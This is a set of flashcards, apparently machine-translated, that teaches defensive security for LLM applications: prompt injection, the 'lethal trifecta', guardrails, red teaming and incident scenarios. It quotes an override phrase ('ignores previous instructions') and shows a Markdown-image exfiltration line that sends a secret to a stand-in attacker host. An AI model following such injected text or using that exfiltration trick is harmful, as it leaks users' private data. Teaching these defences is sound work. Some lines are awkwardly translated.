# LLM security & guardrails — Flashcards
Tags: #flashcards #ai-engineering #security #guardrails #llm
Verified on: 25 September 2026 — global date preserved; targeted review of 13 November 2026 detailed in Sources.
<!-- summary: OWASP Top 10 LLM 2026, exposure of the hidden context and change of identifiers, direct or indirect injection, “lethal trifecta”, exfiltration, excessive agency, guardrails (Llama Guard, NeMo Guardrails), red teaming, false positive injection detectors, fail-open, cost of false positives. -->


What is the OWASP Top 10 for LLM applications? <!--anki:632c333a387a5244477d-->
?
A **grid of risks** for LLM applications. The **2026** edition covers injection, sensitive disclosure, excessive autonomy, supply chain, poisoning, unbounded consumption, disinformation, exposure of the hidden context, vulnerabilities of embeddings and incorrect processing of exits.

Numbers change between editions: **Excessive Agency is LLM03:2026**, against LLM06:2025; **Hidden Context Exposure is LLM08:2026**, beyond the only system prompt.

It is neither a certificate nor a classification adapted to each product. Link each relevant risk to a controllable input, asset, control and a test representative of the actual system.

---

What is prompt injection? <!--anki:78626b675874437c263f-->
?
Text that **detracts from the instructions in the model** ("ignores previous instructions and..."). The model does not reliably separate **instructions** and **data**: any text in the context can act as an instruction.

It is **direct** in a user request or **indirect** in a page, document, or tool result. For example, a summary document attempts to impose a new task on the wizard. The delimiters help report data, but the decisive protections limit permissions and control the actions performed.

---

Do not confuse: direct injection and indirect injection? <!--anki:4a452b7d3f7c7c5b5855-->
?
- **Direct**: Hostile instruction arrives in user request.
- **Indirect**: it is hidden in a **third-party content** that the model reads: web page, [[22-advanced-rag|RAG]] document, email, [[33-mcp|MCP]] tool or server result

The indirect can reach an agent without access to its session. In both cases, the impact depends on the application's **effective permissions**, sometimes greater than those of the sender. A valid user identity does not make its text trustworthy; control actions regardless of the model's instructions.

---

Do not confuse: jailbreak and prompt injection? <!--anki:7821563b7b394e363f24-->
?
- **Jailbreak** The **User** seeks to make the model produce content that the supplier prohibits (weapon, malicious code). The potential victim is **The Outside** ; the risk is reputation and compliance
- **Prompt injection**: a **third party** slips instructions into the data that the agent reads, to divert his actions. The victim is **user or company**; the risk is exfiltration and unauthorized action

Content guards deal primarily with the former. The second is treated by the **Architecture** : rights, isolation, Validation ([[103-agent-defenses|Defenses]]).

---

What is the "lethal trifecta"? <!--anki:4e762977794d6b4f2638-->
?
The dangerous combination (Simon Willison): an agent who has **access to private data**, **reads unreliable content**, and can **communicate outwards**. An injection can **exfiltrate** the data. At least one of the three must be broken.

For example, an assistant reads a hostile page while having access to an internal folder and a sending tool. The page may attempt to transfer that folder. Reducing access, separating contexts, and controlling destinations decreases this risk; blocking a known domain does not neutralize all exfiltration channels.

---

How can an exfiltration occur without an explicit tool? <!--anki:7441303f5d7636263565-->
?
For example via a **Markdown image** whose URL contains the data (`![](https://attaquant.com/?d=SECRET)`), automatically loaded by the interface. Hence the filtering of the URLs and the rendering of the outputs.

The browser or rendering server then performs the network request, even if the agent does not have an explicit sending tool. Blocking unauthorized external uploads, sanitizing rendering, and controlling redirects. The control should focus on what the interface executes, not just on the list of tools visible to the model.

---

What is the excessive agency? <!--anki:7943244e636f73475571-->
?
Give an agent **more functions, permissions, or autonomy** than necessary. Answer: **less privilege** (minimum tools, user rights, read-only by default) and [[31-agent-fundamentals|human-in-the-loop]] for sensitive actions.

Example: A wizard that needs to read an invoice does not need to be able to edit all accounts receivable. Separately reduce available functions, accessible resources, and actions without validation. Caution guidelines do not compensate for a service account that is too powerful; permission must be checked at runtime.

---

Why treat the output of the LLM as an unreliable input? <!--anki:65306e605463232f6447-->
?
Because it can contain **SQL, HTML/JS, or injected shell** commands: one **validates and escapes** before executing or displaying it, and one validates the arguments of a [[32-tool-calling|appel d'tool]] **before** execution.

Adjust control to the **output consumer**: Queries set for SQL values, made HTML safe for display, business functions bounded for actions. A valid JSON can request a forbidden amount or an object belonging to another client. Validate structure, business sense, and permission, not just syntax.

---

What is a guardrail? <!--anki:46597a4e606731357673-->
?
A **control placed around the model**:
- **Input**: detection of injection, jailbreak, PII, prohibited subjects
- **Output**: toxicity, data leakage, conformance of format, anchoring in sources

A control can be deterministic, such as an amount limit, or probabilistic, such as a content detector. It is necessary to define its error rate and behavior in case of doubt: block, reformulate or review. Combine several layers and test their bypasses; a guardrail does not replace the permissions applied by the tool.

---

Which guardrail tool for what need: PII, injection, dangerous content, dialog rules, output format? <!--anki:3362383461626362623366353435353739336437393164303264653933393364-->
?
- **PII**: detection and masking, for example Presidio; masking does not ensure irreversible anonymization.
- **Injection**: Dedicated classifier, for example Prompt Guard.
- **Dangerous content**: Llama Guard or supplier filters.
- **Dialogue**: Chaining rules, such as NeMo Guardrails.
- **Format/values**: schema validation and business rules, possibly Guardrails AI.

Example: A content filter can accept polished text containing private data; a JSON validator does not detect this leak. Test each layer on its threat, with false positives, false negatives, and latency. Set the handling of an unavailability; no classifier replaces the [[103-agent-defenses|Authorisation controls]].

---

How to secure a RAG? <!--anki:78747579616d4a56674e-->
?
Applying them **ACL at the time of retrieval** ([[22-advanced-rag|metadata filtering]]): the user must not **never** retrieve a document that he is not entitled to see, because the model would copy it in its answer.
```python
# the filter comes from the authenticated session, never from the prompt or the model
chunks = index.search(
    query=question,
    k=20,
    filter={"tenant": session.tenant_id,
            "groupes": {"$in": session.groupes}},   # imposed server side
)
```
The filter comes from the code and must block any **unauthorized** exposure, including to rerankers, caches, and citations. Some engines filter after an internal ANN scan: this can reduce recall, without requiring that prohibited candidates be sent to the model ([[134-vector-search-ann|Filtering and indexing ANN]]).

---

Why not put secrets in the system prompt? <!--anki:79693068352c4d69676d-->
?
The system prompt **is not a safe**: its contents can be reproduced, transformed or revealed by an attack or error, so one should not base the confidentiality of a secret on the sole instruction not to display it.

Keep keys and passwords in a secret manager, used by the code with limited rights. The rules can be described in the prompt, but their effective application must live outside the model: IAM, validation and [[81-litellm-api-layer|gateway]].

---

What is red teaming LLM? <!--anki:713e5f4c26353f69634e-->
?
**Voluntarily attacking** its application (injections, Jailbreaks, exfiltration) before and after production, manually or with tools such as **Garak**, **PyrIT** or **Promptfoo**, and transform successful attacks into **Regression tests**.

Define an authorized perimeter, attack objectives and observable criteria: undue access, unauthorized action, data leakage. Test the entire application, including rendering, tools and memory. A list of all blocked attacks does not prove the absence of a flaw; vary scenarios and document coverage limits.

---

Why should a prompt injection detector also be evaluated on legitimate content that is difficult? <!--anki:3865386563613238373064373438393562656535666265393033336335333833-->
?
A **detector** can falsely block an attack quote, code, or training document. Measuring only successful attacks ignores this cost of false positives.

Build two sets: representative attacks and authorized content that are similar to them. Measure workarounds, unjustified blocks and impact on the task, with the threshold deployed. Segment by language and format. A better recall of attacks can greatly degrade the utility; the authorization control must remain independent of the score of the detector.

---

Why explicitly define the behavior of an application when its guardrail is unavailable? <!--anki:6133313236613031306334643437313662663839316437643437616234393535-->
?
A technical exception can otherwise lead to **silently allowing all traffic** or unnecessarily blocking the entire service.

Choose the behavior according to the action: block sensitive writing, offer a limited read or report unavailability. Tester timeout, invalid exit and detector failure. A probabilistic guardrail remains separate from the deterministic authorization applied to the business service.

---

Calculation: a 10,000 scan filter entries of which 1% are malicious. Its sensitivity is 90% and its false positive rate 2%. How many alerts are true and what is their approximate accuracy? <!--anki:3835373465633030666661613435656138373631616531303637386331346164-->
?
On 100 attacks, **90 are detected**. On 9,900 benign entries, **198 trigger a false alert**. Accuracy is **90 / 288 ≈ 31.25%**.

Despite good sensitivity, the majority of alerts are false in this traffic. Sizing the review and measuring the impact of blockages. This calculation assumes stable rates and a representative sample.

---

## Scenarios

Scenario: your internal RAG chatbot responds to an intern by quoting a confidential HR document on salaries. The team proposes to add to the system prompt "never disclose confidential information". What do you do? <!--anki:4d6a31404a49703625-->
?
1. **Reject this false solution**: a prompt is not a control, it bypasses
2. **Applying ACLs to Retrieval** : filter documents according to user rights **before** that they do not enter into the context ([[22-advanced-rag|metadata filtering]])
3. **Check for ingestion**: Are rights spread on each chunk? Are other documents misclassified?
4. **Treat the incident**: find in the tracks who saw what, prevent HR and security
5. **Add regression test**: a non-rights profile must never retrieve this document

**Trap**: rely on an output filter to locate sensitive information.

---

Scenario: a user posts on a forum the full system prompt of your assistant. It contains a key of API and the trade discount rules. What actions, in what order? <!--anki:4b7b6e6a5f5a524b2421-->
?
1. **Revoke the key** immediately and issue a new one, stored out of the prompt ([[81-litellm-api-layer|gateway]], secret manager)
2. **Check the use** of the old key in the newspapers during the exposure period
3. **Exit the business rules of the prompt**: the calculation of discounts is done in the code or in a tool, not by the model
4. **Considering the prompt as public**: nothing in it should be secret or enough to circumvent a rule
5. **Test the flight of the prompt** in the red teaming ([[105-agentic-ai-devsecops|DevSecOps]])

**Trap**: add "never reveal your prompt", which does not prevent the flight.

---

## Sources

- [OWASP — Top 10 Risks of LLM Applications](https://genai.owasp.org/llm-top-10/)
- [MCP — Best Safety Practices, Edition 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)

Targeted review of 13 November 2026: affirmations specified in this pass; other content is not fully verified.

- [OWASP — Top 10 LLM, 2026 Edition](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/) — Official PDF accessed; the historical index `/llm-top-10/` still displays the 2025 edition.
- [OWASP — PDF 2026](https://genai.owasp.org/download/56857/) — numbers, labels and perimeter changes.

## Connections
- [[22-advanced-rag|Advanced RAG]] — injection via documents, ACL
- [[32-tool-calling|Tool calling]] — validate before running
- [[33-mcp|MCP]] — third-party servers and tool results
- [[34-harness-plugins|Harness & plugins]] — permissions and sandbox
- [[81-litellm-api-layer|LiteLLM]] — keys, budgets and rate limits against unbounded consumption
- [[38-agent-platforms|Platforms of agents]] — guardrails as brick
- [[91-langfuse-observability|Langfuse]] — monitor abuse
- [[39-agent-memory|Memorandum of agents]] — persistent memory poisoning
- [[115-agent-platforms-governance|— Agent Platforms Architecture & Governance]] — Identity, Access Policies and Top 10 OWASP Agentic
- [[102-agent-threats|Security of agents — Threats & incidents]] — real attacks and incidents
- [[103-agent-defenses|Security agents — Defensive architecture]] — Rule of Two, design patterns, defense in depth
- [[104-mcp-skills-security|Security of MCP & Skills]] — tool poisoning, rug pull, skills malveillants
- [[105-agentic-ai-devsecops|DevSecOps for Agentic AI]] — threat modeling, adversarial tests, incident response
- [[106-coding-agent-security|Security of Code Agents]] — agents on dev stations and in the IC
- [[143-hallucinations-grounding|Hallucinations & grounding]] — output controls
- [[152-pii-privacy|PII & Privacy]] — data breaches
- [[156-responsible-ai|IA responsable]] — harmful content and excessive refusal
- [[13-production-prompts|Prompt in production]] — structure, versioning and portability of prompts
- [[23-knowledge-graphs-ontologies|Knowledge graphs]] — GraphRAG and related data
- [[26-text-to-sql|Text-to-SQL]] — answer numerical questions on tables
- [[46-crewai-crews|CrewAI — Crews]] — Role-Based Agent Teams
- [[141-system-design-llm|System Design LLM]] — design method
- [[145-system-design-cases|Case of system design]] — of commented type architectures
- [[161-vision-language-models|Vision-language models]] — input images and screens
- [[164-local-edge-llm|Local LLM & Edge]] — run a model locally
- [[165-computer-use-browser-agents|Computer use & browser agents]] — agents that use interfaces
- [[00-moc-ai-engineering|MOC AI Engineering]]
